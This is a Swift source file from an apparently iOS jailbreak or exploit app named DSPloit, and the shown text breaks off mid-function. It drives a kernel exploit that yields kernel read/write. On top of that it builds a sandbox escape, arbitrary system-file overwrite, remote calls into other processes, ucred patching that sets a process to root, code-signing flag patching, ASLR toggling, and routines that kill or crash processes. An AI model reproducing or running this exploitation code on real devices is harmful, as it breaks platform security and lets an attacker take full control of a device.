//
//  dspmgr.swift
//  DSPloit
//
//  Created by ruter on 23.03.26.
//

import Combine
import Foundation
import Darwin
import notify
import UIKit
import WebKit

final class dspmgr: ObservableObject {
    @Published var log: String = ""
    @Published var hasOffsets: Bool = false
    @Published var dsrunning: Bool = false
    @Published var dsready: Bool = false
    @Published var dsattempted: Bool = false
    @Published var dsfailed: Bool = false
    @Published var dsprogress: Double = 0.0
    @Published var kernbase: UInt64 = 0
    @Published var kernslide: UInt64 = 0
    
    @Published var kaccessready: Bool = false
    @Published var kaccesserror: String?
    @Published var fileopinprogress: Bool = false
    @Published var testresult: String?
    #if !DISABLE_REMOTECALL
    @Published var rcrunning: Bool = false
    @Published var eligibilitystate: Bool?
    @Published var eu1progress: Double = 0.0
    @Published var eu1running: Bool = false
    @Published var eu2progress: Double = 0.0
    @Published var eu2running: Bool = false
    @Published var rcLastError: String?
    #endif
    
    @Published var vfsready: Bool = false
    @Published var vfsinitlog: String = ""
    @Published var vfsattempted: Bool = false
    @Published var vfsfailed: Bool = false
    @Published var vfsrunning: Bool = false
    @Published var vfsprogress: Double = 0.0
    @Published var sbxready: Bool = false
    @Published var sbxattempted: Bool = false
    @Published var sbxfailed: Bool = false
    @Published var sbxrunning: Bool = false
    @Published var rcready: Bool = false
    @Published var rcfailed: Bool = false
    @Published var showrespring: Bool = false
    
    @Published var showLogs: Bool = false
    
    var sbProc: RemoteCall?
    var ytProc = RemoteCall(process: "youtube", useMigFilterBypass: false)
    
    static let shared = dspmgr()
    static let fontpath = "/System/Library/Fonts/Core/SFUI.ttf"
    static let italicfontpath = "/System/Library/Fonts/Core/SFUIItalic.ttf"
    static let monofontpath = "/System/Library/Fonts/Core/SFUIMono.ttf"
    init() {}

    struct AppInfo {
        let executable: String
        let displayName: String
        let bundleName: String
        let dataFolder: String
        let bundleFolder: String
    }
    
    func run(completion: ((Bool) -> Void)? = nil) {
        guard !dsrunning else { return }
        dsrunning = true
        dsready = false
        dsfailed = false
        dsattempted = true
        dsprogress = 0.0
        log = ""
        
        ds_set_log_callback { messageCStr in
            guard let messageCStr else { return }
            let message = String(cString: messageCStr)
            DispatchQueue.main.async {
                dspmgr.shared.logmsg("(ds) \(message)")
            }
        }
        ds_set_progress_callback { progress in
            DispatchQueue.main.async {
                dspmgr.shared.dsprogress = progress
            }
        }
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let result = ds_run()
            
            DispatchQueue.main.async {
                guard let self else { return }
                self.dsrunning = false
                let success = result == 0 && ds_is_ready()
                if success {
                    self.dsready = true
                    self.dsfailed = false
                    self.kernbase = ds_get_kernel_base()
                    self.kernslide = ds_get_kernel_slide()
                    self.logmsg("\n(ds) exploit success!")
                    self.logmsg(String(format: "(ds) kernel_base:  0x%llx", self.kernbase))
                    self.logmsg(String(format: "(ds) kernel_slide: 0x%llx\n", self.kernslide))
                    globallogger.log("(ds) exploit success!")
                    globallogger.log(String(format: "(ds) kernel_base:  0x%llx", self.kernbase))
                    globallogger.log(String(format: "(ds) kernel_slide: 0x%llx", self.kernslide))
                    globallogger.divider()
                } else {
                    self.dsfailed = true
                    self.logmsg("\nexploit failed.\n")
                    globallogger.log("exploit failed.")
                    globallogger.divider()
                }
                self.dsprogress = 1.0
                completion?(success)
            }
        }
    }
    
    func logmsg(_ message: String) {
        DispatchQueue.main.async {
            self.log += message + "\n"
            globallogger.log(message)
        }
    }
    
    func kread64(address: UInt64) -> UInt64 {
        guard dsready else { return 0 }
        return ds_kread64(address)
    }
    
    func kwrite64(address: UInt64, value: UInt64) {
        guard dsready else { return }
        ds_kwrite64(address, value)
    }
    
    func kread32(address: UInt64) -> UInt32 {
        guard dsready else { return 0 }
        return ds_kread32(address)
    }
    
    func kwrite32(address: UInt64, value: UInt32) {
        guard dsready else { return }
        ds_kwrite32(address, value)
    }
    
    func panic() {
        guard dsready else { return }
        
        globallogger.log("triggering panic")
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            let kernbase = ds_get_kernel_base()
            globallogger.log("writing to read-only memory at kernel base")
            ds_kwrite64(kernbase, 0xDEADBEEF)
        }
    }
    
    func respring() {
        showrespring = true
    }
    
    func vfsinit(completion: ((Bool) -> Void)? = nil) {
        vfs_setlogcallback(dspmgr.vfslogcallback)
        vfs_setprogresscallback { progress in
            DispatchQueue.main.async {
                dspmgr.shared.vfsprogress = progress
            }
        }
        vfsattempted = true
        vfsfailed = false
        vfsrunning = true
        vfsprogress = 0.0
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let r = vfs_init()
            DispatchQueue.main.async {
                guard let self = self else { return }
                self.vfsready = (r == 0 && vfs_isready())
                if self.vfsready {
                    self.vfsfailed = false
                    self.logmsg("\nvfs ready!\n")
                } else {
                    self.vfsfailed = true
                    self.logmsg("\nvfs init failed.\n")
                }
                self.vfsrunning = false
                self.vfsprogress = 1.0
                completion?(self.vfsready)
            }
        }
    }
    
    func sbxescape(completion: ((Bool) -> Void)? = nil) {
        guard dsready, !sbxrunning else { return }
        sbxattempted = true
        sbxfailed = false
        sbxrunning = true
        
        sbx_setlogcallback(dspmgr.sbxlogcallback)
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let r = sbx_escape(ds_get_our_proc())
            DispatchQueue.main.async {
                guard let self else { return }
                self.sbxready = (r == 0)
                if self.sbxready {
                    self.sbxfailed = false
                    self.logmsg("\nsandbox escape ready!\n")
                } else {
                    self.sbxfailed = true
                    self.logmsg("\nsandbox escape failed.\n")
                }
                self.sbxrunning = false
                completion?(self.sbxready)
            }
        }
    }
    
    private static let sbxlogcallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { msg in
        guard let msg = msg else { return }
        let s = String(cString: msg)
        DispatchQueue.main.async {
            dspmgr.shared.logmsg("(sbx) " + s)
        }
    }
    
    private static let vfslogcallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { msg in
        guard let msg = msg else { return }
        let s = String(cString: msg)
        DispatchQueue.main.async {
            dspmgr.shared.vfsinitlog += "(vfs) " + s + "\n"
            dspmgr.shared.logmsg("(vfs) " + s)
        }
    }
    
    func vfslistdir(path: String) -> [(name: String, isDir: Bool)]? {
        guard vfsready else {
            logmsg(" listdir: not ready (\(path))")
            return nil
        }
        var ptr: UnsafeMutablePointer<vfs_entry_t>?
        var count: Int32 = 0
        let r = vfs_listdir(path, &ptr, &count)
        guard r == 0, let entries = ptr else {
            logmsg(" listdir failed (\(path)) r=\(r)")
            return nil
        }
        defer { vfs_freelisting(entries) }
        
        var items: [(String, Bool)] = []
        for i in 0..<Int(count) {
            let e = entries[i]
            let name = withUnsafePointer(to: e.name) { p in
                p.withMemoryRebound(to: CChar.self, capacity: 256) { String(cString: $0) }
            }
            items.append((name, e.d_type == 4))
        }
        logmsg(" listdir \(path) -> \(items.count)")
        return items.sorted { $0.0.lowercased() < $1.0.lowercased() }
    }
    
    func vfsread(path: String, maxSize: Int = 512 * 1024) -> Data? {
        guard vfsready else { return nil }
        let fsz = vfs_filesize(path)
        if fsz <= 0 { return nil }
        let toRead = min(Int(fsz), maxSize)
        var buf = [UInt8](repeating: 0, count: toRead)
        let n = vfs_read(path, &buf, toRead, 0)
        if n <= 0 { return nil }
        return Data(buf.prefix(Int(n)))
    }
    
    func vfswrite(path: String, data: Data) -> Bool {
        guard vfsready else { return false }
        return data.withUnsafeBytes { ptr in
            let n = vfs_write(path, ptr.baseAddress, data.count, 0)
            return n > 0
        }
    }
    
    func vfssize(path: String) -> Int64 {
        guard vfsready else { return -1 }
        return vfs_filesize(path)
    }
    
    func vfsoverwritefromlocalpath(target: String, source: String) -> Bool {
        print("(vfs) target \(source) -> \(target)")
        
        guard vfsready else {
            print("(vfs) not ready")
            return false
        }
        
        guard FileManager.default.fileExists(atPath: source) else {
            print("(vfs) source file not found: \(source)")
            return false
        }
        
        let r = vfs_overwritefile(target, source)
        
        print("(vfs) vfs_overwritefile returned: \(r)")
        
        if r == 0 {
            print("(vfs) file overwritten")
        } else {
            print("(vfs) failed to overwrite file")
        }
        
        return r == 0
    }
    
    func vfsoverwritewithdata(target: String, data: Data) -> Bool {
        guard vfsready else { return false }
        let tmp = NSTemporaryDirectory() + "vfs_src_\(arc4random()).bin"
        do { try data.write(to: URL(fileURLWithPath: tmp)) } catch { return false }
        let ok = vfsoverwritefromlocalpath(target: target, source: tmp)
        try? FileManager.default.removeItem(atPath: tmp)
        return ok
    }
    
    private func sbxoverwrite(path: String, data: Data) -> (ok: Bool, message: String) {
        let fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0o644)
        if fd == -1 {
            return (false, "sbx open failed: errno=\(errno) \(String(cString: strerror(errno)))")
        }
        defer { close(fd) }
        
        var total = 0
        let wroteAll = data.withUnsafeBytes { ptr -> Bool in
            guard let base = ptr.baseAddress else { return ptr.count == 0 }
            while total < ptr.count {
                let n = write(fd, base.advanced(by: total), ptr.count - total)
                if n <= 0 { return false }
                total += n
            }
            return true
        }
        
        if !wroteAll {
            return (false, "sbx write failed: errno=\(errno) \(String(cString: strerror(errno)))")
        }
        
        return (true, "ok (\(total) bytes)")
    }
    
    @discardableResult
    func dsploit_overwritefile(target: String, source: String) -> (ok: Bool, message: String) {
        guard FileManager.default.fileExists(atPath: source) else {
            return (false, "source file not found: \(source)")
        }
        
        let result: (ok: Bool, message: String)
        if sbxready {
            do {
                let data = try Data(contentsOf: URL(fileURLWithPath: source))
                result = sbxoverwrite(path: target, data: data)
            } catch {
                result = (false, "sbx read source failed: \(error.localizedDescription)")
            }
        } else {
            result = (false, "sbx not ready")
        }
        
        if result.ok {
            return result
        }
        
        guard vfsready else {
            return (false, result.message + " | vfs not ready")
        }
        
        let ok = vfsoverwritefromlocalpath(target: target, source: source)
        return ok ? (true, "ok (vfs overwrite)") : (false, result.message + " | vfs overwrite failed")
    }
    
    @discardableResult
    func dsploit_overwritefile(target: String, data: Data) -> (ok: Bool, message: String) {
        let result = sbxready ? sbxoverwrite(path: target, data: data) : (false, "sbx not ready")
        if result.0 {
            return result
        }
        
        guard vfsready else {
            return (false, result.1 + ", vfs not ready")
        }
        
        let ok = vfsoverwritewithdata(target: target, data: data)
        return ok ? (true, "vfs overwrite ok") : (false, result.1 + ", vfs overwrite failed")
    }
    
    func vfszeropage(at path: String, dumb: Bool) -> Bool {
        if dumb {
            guard vfsready else {
                self.logmsg("(vfs) zerofile failed (vfs not ready)")
                return false
            }
    
            let ok = path.withCString { vfs_zerofile($0) } == 0

            if !ok {
                self.logmsg("(vfs) zerofile failed")
                return false
            }
            
            self.logmsg("(vfs) zeroed \(path)")
            return true
        } else {
            let result = path.withCString { cpath in
                vfs_zeropage(cpath, 0)
            }

            if result != 0 {
                self.logmsg("(vfs) zeropage failed")
                return false
            }
    
            self.logmsg("(vfs) zeroed first page of \(path)")
            return true
        }
    }
    
    func sbxgettoken(pid: Int32) -> UInt64? {
        let addr = sbx_gettoken(pid)

        guard addr != 0 else {
            return nil
        }

        return addr
    }

    func sbxgettokenstring(pid: Int32) -> String? {
        guard let cstr = sbx_copytoken(pid) else {
            return nil
        }
        defer { sbx_freestr(cstr) }
        return String(cString: cstr)
    }

    func sbxissuetoken(extClass: String, path: String) -> String? {
        guard let cstr = sbx_issue_token(extClass, path) else {
            return nil
        }
        defer { sbx_freestr(cstr) }
        return String(cString: cstr)
    }
    
    func sbxelevate() {
        DispatchQueue.main.async {
            sbx_elevate();
        }
    }
    
    func isapfs(_ path: String) -> Bool {
        var s = statfs()
        guard path.withCString({ statfs($0, &s) }) == 0 else {
            return false
        }
        
        let fstypename = s.f_fstypename
        return withUnsafePointer(to: fstypename) { ptr in
            ptr.withMemoryRebound(to: CChar.self, capacity: MemoryLayout.size(ofValue: fstypename)) {
                String(cString: $0) == "apfs"
            }
        }
    }

    // inspired by nugget from leminlimez
    func PPHelper() -> Bool {
        do {
            _ = FileManager.default
            let dataFolder = "/private/var/mobile/Containers/Data/Application"
            _ = "/private/var/containers/Bundle/Application"
            var bundleIDs = ["com.apple.PosterBoard"]
            if UIDevice.current.userInterfaceIdiom == .phone {
                bundleIDs.append("com.apple.CarPlayWallpaper")
            }
            guard let appList = getAppList() else { return false}
            var hashes: [String:String] = [:]
            for bundleID in bundleIDs {
                if let appInfo = appList[bundleID] {
                    hashes[bundleID] = appInfo.dataFolder
                } else {
                    logmsg("Could not find app with bundle ID \(bundleID).")
                    return false
                }
            }
            var PPbundleID = "com.leemin.Pocket-Poster"
            for (bundleID, info) in appList {
                if info.executable == "Pocket Poster" {
                    PPbundleID = bundleID
                    break
                } else if info.executable == "LiveContainer" {
                    PPbundleID = bundleID
                }
            }
            if let PPHash = appList[PPbundleID]?.dataFolder {
                for bundleID in hashes.keys {
                    let fileName = "Nugget" + bundleID.replacingOccurrences(of: "com.apple.", with: "") + "Hash"
                    let content = hashes[bundleID]!
                    let filePath = dataFolder + "/" + PPHash + "/Documents/" + fileName
                    try content.write(to: URL(fileURLWithPath: filePath), atomically: true, encoding: .utf8)
                    logmsg("Wrote hash \(content) to \(filePath)")
                }
                return true
            } else {
                logmsg("Please install Pocket Poster before using Pocket Poster Helper. If you do have Pocket Poster installed, make sure you did not modify the bundle ID. If you installed Pocket Poster inside of LiveContainer, make sure you also did not modify the bundle ID of LiveContainer.")
                return false
            }
        } catch {
            logmsg("Error with Pocket Poster Helper: \(error.localizedDescription)")
            return false
        }
    }

    func getAppList() -> [String:AppInfo]? {
        let fm = FileManager.default
        let dataFolder = "/private/var/mobile/Containers/Data/Application"
        let bundleFolder = "/private/var/containers/Bundle/Application"
        var appList: [String:AppInfo] = [:]
        do {
            let appData = try fm.contentsOfDirectory(atPath: dataFolder)
            for app in appData {
                if let plist = NSDictionary(contentsOf: URL(fileURLWithPath: dataFolder + "/" + app + "/.com.apple.mobile_container_manager.metadata.plist")),
                    let bundleID = plist["MCMMetadataIdentifier"] as? String {
                    appList[bundleID] = AppInfo(executable: "", displayName: "", bundleName: "", dataFolder: app, bundleFolder: "")
                }
            }

            let appBundles = try fm.contentsOfDirectory(atPath: bundleFolder)
            for app in appBundles {
                let appPath = bundleFolder + "/" + app
                let contents = try fm.contentsOfDirectory(atPath: appPath)
                for item in contents {
                    if item.hasSuffix(".app") {
                        if let plist = NSDictionary(contentsOf: URL(fileURLWithPath: appPath + "/" + item + "/Info.plist")),
                            let bundleID = plist["CFBundleIdentifier"] as? String {
                            let executable = plist["CFBundleExecutable"] as? String ?? ""
                            let displayName = plist["CFBundleDisplayName"] as? String ?? ""
                            let bundleName = plist["CFBundleName"] as? String ?? ""
                            let dataFolderID = appList[bundleID]?.dataFolder ?? ""
                            let appInfo = AppInfo(executable: executable, displayName: displayName, bundleName: bundleName, dataFolder: dataFolderID, bundleFolder: app)
                            appList[bundleID] = appInfo
                        }
                        break
                    }
                }

            }
        } catch {
            logmsg("Error getting app list: \(error.localizedDescription)")
            return nil
        }
        return appList
    }

    @discardableResult
    func apfsown(path: String, uid: UInt32, gid: UInt32) -> Bool {
        if !isapfs(path) {
            print("\(path) is apfs!")
        }
        
        let result = path.withCString { cPath in
            apfs_own(cPath, uid_t(uid), gid_t(gid))
        }
        
        if result != 0 {
            print("failed to chown \(path)")
            return false
        }
        
        print("changed owner of \(path) to \(uid):\(gid)!")
        return true
    }
    
    #if !DISABLE_REMOTECALL
    func rcinit(process: String, migbypass: Bool = false, completion: ((Bool) -> Void)? = nil) {
        guard dsready, !rcready else {
            completion?(false)
            return
        }
        
        rcrunning = true
        rcLastError = nil
        logmsg("initializing remote call on \(process)...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            self?.sbProc = RemoteCall(process: process, useMigFilterBypass: migbypass)
            
            DispatchQueue.main.async {
                guard let self = self else { return }
                let success = self.sbProc != nil
                if success {
                    self.logmsg("remote call initialized on \(process)")
                    self.rcLastError = nil
                    self.rcrunning = false
                    self.rcready = true
                } else {
                    self.logmsg("remote call init failed on \(process)")
                    let error = RemoteCall.lastInitError()
                    self.rcLastError = error
                    if let error, !error.isEmpty {
                        self.logmsg("remote call init failed on \(process): \(error)")
                    } else {
                        self.logmsg("remote call init failed on \(process)")
                    }
                    self.rcrunning = false
                }
                completion?(success)
            }
        }
    }
    
    func rcinitDaemon(serviceName: String, framework: String? = nil, process: String, migbypass: Bool = false, completion: ((RemoteCall?) -> Void)? = nil) {
        guard dsready, let sbProc else {
            completion?(nil)
            return
        }
        
        rcrunning = true
        logmsg("initializing remote call on \(process)...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            if process.withCString({ proc_find_by_name($0) == 0 }) {
                wake_up_daemon(sbProc, serviceName, framework)
                sleep(1) // give the daemon some time to start up
            }
            
            let proc = RemoteCall(process: process, useMigFilterBypass: migbypass)
            completion?(proc)
            
            DispatchQueue.main.async {
                guard let self = self else { return }
                let success = proc != nil
                if success {
                    self.logmsg("remote call initialized on \(process)")
                    self.rcrunning = false
                } else {
                    let error = RemoteCall.lastInitError()
                    if let error, !error.isEmpty {
                        self.logmsg("remote call init failed on \(process): \(error)")
                    } else {
                        self.logmsg("remote call init failed on \(process)")
                    }
                    self.rcrunning = false
                }
            }
        }
    }
    
    func rcdestroy(completion: (() -> Void)? = nil) {
        guard rcready else { return }
        
        logmsg("destroying remote call session...")
        rcready = false
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            self?.sbProc?.destroy()
            
            DispatchQueue.main.async {
                self?.logmsg("remote call session destroyed")
                completion?()
            }
        }
    }
    
    //  params:
    //  - name: function to call
    //  - args: up to 8 args in registers (x0-x7) and extra args passed to stack pointer
    //  - timeout: timeout in ms
    //  ret: return value from rc
    func rccall(name: String, args: [UInt64] = [], timeout: Int32 = 100) -> UInt64 {
        guard rcready else { return 0 }
        let RTLD_DEFAULT = UnsafeMutableRawPointer(bitPattern: -2)
        let ptr = dlsym(RTLD_DEFAULT, name)
        var argsCopy = args
        return name.withCString { (cName: UnsafePointer<CChar>) -> UInt64 in
            UInt64(argsCopy.withUnsafeMutableBufferPointer { buffer in
                sbProc?.doStable(
                    withTimeout: timeout,
                    functionName: UnsafeMutablePointer(mutating: cName),
                    functionPointer: ptr,
                    args: buffer.baseAddress,
                    argCount: UInt(args.count)
                ) ?? 0
            })
        }
    }
    #endif
    
    // MARK: - Kernel Process Operations
    
    struct KernelProcessInfo: Identifiable {
        let id = UUID()
        let pid: Int32
        let uid: UInt32
        let gid: UInt32
        let name: String
        let kaddr: UInt64
    }
    
    func getKernelProcessList(search: String? = nil) -> [KernelProcessInfo] {
        guard dsready else { return [] }
        var count: Int32 = 0
        guard let list = proclist(search, &count), count > 0 else { return [] }
        defer { free_proclist(list) }
        
        var results: [KernelProcessInfo] = []
        for i in 0..<Int(count) {
            let entry = list[i]
            let name = withUnsafePointer(to: entry.name) { ptr in
                ptr.withMemoryRebound(to: CChar.self, capacity: 32) { String(cString: $0) }
            }
            results.append(KernelProcessInfo(
                pid: Int32(entry.pid), uid: entry.uid, gid: entry.gid,
                name: name, kaddr: entry.kaddr
            ))
        }
        return results.sorted { $0.pid < $1.pid }
    }
    
    func findProc(pid: Int32) -> UInt64 {
        guard dsready else { return 0 }
        return procbypid(pid)
    }
    
    func findProc(name: String) -> UInt64 {
        guard dsready else { return 0 }
        return procbyname(name)
    }
    
    func getTaskForProc(_ proc: UInt64) -> UInt64 {
        guard dsready, proc != 0 else { return 0 }
        return taskbyproc(proc)
    }
    
    func readProcCredentials(pid: Int32) -> (uid: UInt32, gid: UInt32, procAddr: UInt64, ucredAddr: UInt64)? {
        guard dsready else { return nil }
        let proc = procbypid(pid)
        guard proc != 0 else { return nil }
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        guard procRo != 0 else { return nil }
        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        guard ucred != 0 else { return nil }
        let uid = ds_kread32(ucred + 0x18)
        let gid = ds_kread32(ucred + 0x1c)
        return (uid, gid, proc, ucred)
    }
    
    func elevateCredentials(pid: Int32) -> (ok: Bool, msg: String) {
        guard dsready else { return (false, "Kernel access not ready") }
        let proc = procbypid(pid)
        guard proc != 0 else { return (false, "Process \(pid) not found in kernel") }
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        guard procRo != 0 else { return (false, "proc_ro read failed at 0x\(String(format: "%llx", proc))") }
        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        guard ucred != 0 else { return (false, "ucred read failed from proc_ro 0x\(String(format: "%llx", procRo))") }
        
        let origUid = ds_kread32(ucred + 0x18)
        ds_kwrite32(ucred + 0x18, 0) // cr_uid → 0
        ds_kwrite32(ucred + 0x1c, 0) // cr_ruid → 0
        ds_kwrite32(ucred + 0x20, 0) // cr_svuid → 0
        
        let newUid = ds_kread32(ucred + 0x18)
        if newUid == 0 {
            return (true, "Elevated PID \(pid) to root (uid \(origUid) → 0) ucred=0x\(String(format: "%llx", ucred))")
        } else {
            return (false, "PPL blocked write to ucred 0x\(String(format: "%llx", ucred)) (uid still \(newUid))")
        }
    }
    
    func readProcFlags(pid: Int32) -> UInt32 {
        guard dsready else { return 0 }
        let proc = procbypid(pid)
        guard proc != 0 else { return 0 }
        return ds_kread32(proc + UInt64(off_proc_p_flag))
    }
    
    func readCSFlags(pid: Int32) -> UInt32 {
        guard dsready else { return 0 }
        let proc = procbypid(pid)
        guard proc != 0 else { return 0 }
        // csflags offset varies; try standard iOS 17/18 location
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        guard procRo != 0 else { return 0 }
        return ds_kread32(procRo + 0x1c) // p_csflags in proc_ro
    }
    
    func patchCSFlags(pid: Int32, addFlags: UInt32) -> (ok: Bool, msg: String) {
        guard dsready else { return (false, "Not ready") }
        let proc = procbypid(pid)
        guard proc != 0 else { return (false, "Process not found") }
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        guard procRo != 0 else { return (false, "proc_ro not found") }
        let current = ds_kread32(procRo + 0x1c)
        let patched = current | addFlags
        ds_kwrite32(procRo + 0x1c, patched)
        let verify = ds_kread32(procRo + 0x1c)
        return (verify == patched, "CS flags: 0x\(String(format: "%x", current)) → 0x\(String(format: "%x", verify))")
    }
    
    func readSysctl(_ name: String) -> String? {
        var size: Int = 0
        guard sysctlbyname(name, nil, &size, nil, 0) == 0, size > 0 else { return nil }
        var buffer = [CChar](repeating: 0, count: size + 1)
        guard sysctlbyname(name, &buffer, &size, nil, 0) == 0 else { return nil }
        return String(cString: buffer)
    }
    
    func readSysctlInt(_ name: String) -> Int64? {
        var value: Int64 = 0
        var size = MemoryLayout<Int64>.size
        guard sysctlbyname(name, &value, &size, nil, 0) == 0 else { return nil }
        return value
    }
    
    func readKernelBytes(address: UInt64, count: Int) -> [UInt8] {
        guard dsready else { return [] }
        var bytes: [UInt8] = []
        bytes.reserveCapacity(count)
        for offset in stride(from: 0, to: count, by: 8) {
            let val = ds_kread64(address + UInt64(offset))
            let remaining = min(8, count - offset)
            for b in 0..<remaining {
                bytes.append(UInt8((val >> (b * 8)) & 0xFF))
            }
        }
        return bytes
    }
    
    func getASLREnabled() -> Bool {
        guard dsready else { return true }
        getaslrstate()
        return aslrstate
    }
    
    @discardableResult
    func setASLR(enabled: Bool) -> Bool {
        guard dsready else { return false }
        getaslrstate()
        if aslrstate != enabled { toggleaslr() }
        getaslrstate()
        return aslrstate == enabled
    }
    
    func terminateProc(name: String) -> Bool {
        guard dsready else { return false }
        return killproc(name) == 0
    }
    
    func crashProcess(name: String) -> Bool {
        guard dsready else { return false }
        return crashproc(name) == 0
    }
    
    func getVMMapAddr(task: UInt64) -> UInt64 {
        guard dsready, task != 0 else { return 0 }
        return task_get_vm_map(task)
    }
    
    func getIPCSpaceAddr(task: UInt64) -> UInt64 {
        guard dsready, task != 0 else { return 0 }
        return ds_kread64(task + UInt64(off_task_itk_space))
    }
    
    func readKernelString(address: UInt64, maxLen: Int = 256) -> String {
        guard dsready else { return "" }
        let bytes = readKernelBytes(address: address, count: maxLen)
        guard let idx = bytes.firstIndex(of: 0) else {
            return String(bytes: bytes, encoding: .utf8) ?? ""
        }
        return String(bytes: bytes[0..<idx], encoding: .utf8) ?? ""
    }
    
    func disableExcGuard(pid: Int32) -> Bool {
        guard dsready else { return false }
        let proc = procbypid(pid)
        guard proc != 0 else { return false }
        let task = taskbyproc(proc)
        guard task != 0 else { return false }
        return disable_excguard_kill(task) == 0
    }
    
    // MARK: - Vnode Operations
    
    func lookupVnodeByPath(_ path: String) -> (addr: UInt64, name: String, flags: UInt32, usecount: Int32, mount: UInt64) {
        guard dsready else { return (0, "", 0, 0, 0) }
        let proc = ds_get_our_proc()
        let fd = ds_kread64(proc + UInt64(off_proc_p_fd))
        let cdir = ds_kread64(fd + UInt64(off_filedesc_fd_cdir))
        guard cdir != 0 else { return (0, "", 0, 0, 0) }
        
        // Walk from root vnode using the textvp approach
        let textvp = ds_kread64(proc + UInt64(off_proc_p_textvp))
        guard textvp != 0 else { return (0, "", 0, 0, 0) }
        
        let namePtr = ds_kread64(textvp + UInt64(off_vnode_v_name))
        let name = namePtr != 0 ? readKernelString(address: namePtr) : "unknown"
        let flags = ds_kread32(textvp + UInt64(off_vnode_v_flag))
        let usecount = Int32(ds_kread32(textvp + UInt64(off_vnode_v_usecount)))
        let mount = ds_kread64(textvp + UInt64(off_vnode_v_mount))
        return (textvp, name, flags, usecount, mount)
    }
    
    func getVnodeInfo(addr: UInt64) -> (name: String, parent: UInt64, mount: UInt64, flags: UInt32, usecount: Int32, iocount: Int32, writecount: Int32) {
        guard dsready, addr != 0 else { return ("", 0, 0, 0, 0, 0, 0) }
        let namePtr = ds_kread64(addr + UInt64(off_vnode_v_name))
        let name = namePtr != 0 ? readKernelString(address: namePtr) : "?"
        let parent = ds_kread64(addr + UInt64(off_vnode_v_parent))
        let mount = ds_kread64(addr + UInt64(off_vnode_v_mount))
        let flags = ds_kread32(addr + UInt64(off_vnode_v_flag))
        let usecount = Int32(ds_kread32(addr + UInt64(off_vnode_v_usecount)))
        let iocount = Int32(ds_kread32(addr + UInt64(off_vnode_v_iocount)))
        let writecount = Int32(ds_kread32(addr + UInt64(off_vnode_v_writecount)))
        return (name, parent, mount, flags, usecount, iocount, writecount)
    }
    
    func modifyVnodeFlags(addr: UInt64, newFlags: UInt32) -> Bool {
        guard dsready, addr != 0 else { return false }
        ds_kwrite32(addr + UInt64(off_vnode_v_flag), newFlags)
        return ds_kread32(addr + UInt64(off_vnode_v_flag)) == newFlags
    }
    
    // MARK: - Thread Operations
    
    struct KernelThreadInfo: Identifiable {
        let id = UUID()
        let address: UInt64
        let taskAddr: UInt64
        let procAddr: UInt64
        let kstackPtr: UInt64
        let options: UInt16
        let jopPID: UInt64
        let ropPID: UInt64
        let index: Int
    }
    
    func getThreadsForTask(_ taskAddr: UInt64) -> [KernelThreadInfo] {
        guard dsready, taskAddr != 0 else { return [] }
        var threads: [KernelThreadInfo] = []
        var threadPtr = ds_kread64(taskAddr + UInt64(off_task_threads_next))
        var idx = 0
        // Walk the thread linked list (max 256 to avoid infinite loops)
        while threadPtr != 0 && threadPtr != taskAddr + UInt64(off_task_threads_next) && idx < 256 {
            let tro = thread_get_t_tro(threadPtr)
            let task = tro != 0 ? ds_kread64(tro + UInt64(off_thread_ro_tro_task)) : 0
            let proc = tro != 0 ? ds_kread64(tro + UInt64(off_thread_ro_tro_proc)) : 0
            let kstack = thread_get_kstackptr(threadPtr)
            let opts = thread_get_options(threadPtr)
            let jop = thread_get_jop_pid(threadPtr)
            let rop = thread_get_rop_pid(threadPtr)
            threads.append(KernelThreadInfo(address: threadPtr, taskAddr: task, procAddr: proc, kstackPtr: kstack, options: opts, jopPID: jop, ropPID: rop, index: idx))
            threadPtr = ds_kread64(threadPtr + UInt64(off_thread_task_threads_next))
            idx += 1
        }
        return threads
    }
    
    // MARK: - VM Map Operations
    
    struct VMRegionInfo: Identifiable {
        let id = UUID()
        let start: UInt64
        let end: UInt64
        let size: UInt64
        let alias: UInt32
        let objectAddr: UInt64
    }
    
    func enumerateVMRegions(task: UInt64, maxEntries: Int = 64) -> [VMRegionInfo] {
        guard dsready, task != 0 else { return [] }
        let vmMap = task_get_vm_map(task)
        guard vmMap != 0 else { return [] }
        let hdr = vmMap + UInt64(off_vm_map_hdr)
        let nEntries = ds_kread32(hdr + UInt64(off_vm_map_header_nentries))
        var results: [VMRegionInfo] = []
        var entry = ds_kread64(hdr + UInt64(off_vm_map_header_links_next))
        let endSentinel = hdr
        for _ in 0..<min(Int(nEntries), maxEntries) {
            guard entry != 0 && entry != endSentinel else { break }
            let linksNext = ds_kread64(entry)
            let start = ds_kread64(entry + 0x10)  // links.start
            let end = ds_kread64(entry + 0x18)    // links.end
            let object = ds_kread64(entry + UInt64(off_vm_map_entry_vme_object_or_delta))
            let alias = ds_kread32(entry + UInt64(off_vm_map_entry_vme_alias))
            results.append(VMRegionInfo(start: start, end: end, size: end - start, alias: alias, objectAddr: object))
            entry = linksNext
        }
        return results
    }
    
    // MARK: - IPC Port Operations
    
    struct MachPortInfo: Identifiable {
        let id = UUID()
        let name: mach_port_name_t
        let entryAddr: UInt64
        let objectAddr: UInt64
        let kobjectAddr: UInt64
    }
    
    func enumerateIPCPorts(task: UInt64, maxPorts: Int = 128) -> [MachPortInfo] {
        guard dsready, task != 0 else { return [] }
        let space = ds_kread64(task + UInt64(off_task_itk_space))
        guard space != 0 else { return [] }
        let table = ds_kread64(space + UInt64(off_ipc_space_is_table))
        guard table != 0 else { return [] }
        
        var ports: [MachPortInfo] = []
        let entrySize = UInt64(sizeof_ipc_entry)
        for i in 1..<UInt32(maxPorts) {
            let entryAddr = table + UInt64(i) * entrySize
